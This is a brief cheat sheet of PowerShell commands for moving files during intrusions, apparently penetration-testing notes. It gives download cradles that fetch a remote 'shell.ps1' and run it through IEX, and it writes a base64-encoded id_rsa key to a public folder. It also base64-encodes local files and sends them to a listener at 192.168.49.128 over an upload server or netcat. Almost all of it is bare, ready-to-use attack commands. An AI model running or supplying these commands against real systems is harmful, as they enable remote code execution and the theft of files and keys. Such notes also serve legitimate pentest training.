## Powershell Read Write file

```Powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64>"))
```

## Get Hash

```powershell
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

## Download File

```powershell
(New-Object Net.WebClient).DownloadFile('http://test/aaa.ps1','aaa.ps1')
(New-Object Net.WebClient).DownloadFileAsync('http://test/aaa.ps1','aaa.ps1')
wget http://test/aaa.ps1 -o aaa.ps1
```

## IEX

```powershell
(New-Object Net.WebClient).DownloadString('https://test/shell.ps1') | IEX
Invoke-WebRequest https://<ip>/shell.ps1 -UseBasicParsing | IEX
```

## Encode File Using PowerShell

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

## file upload with http

```
$ pip3 install uploadserver
$ python3 -m uploadserver

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

## no fileupload

```
$ nc -lvnp 8000

$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

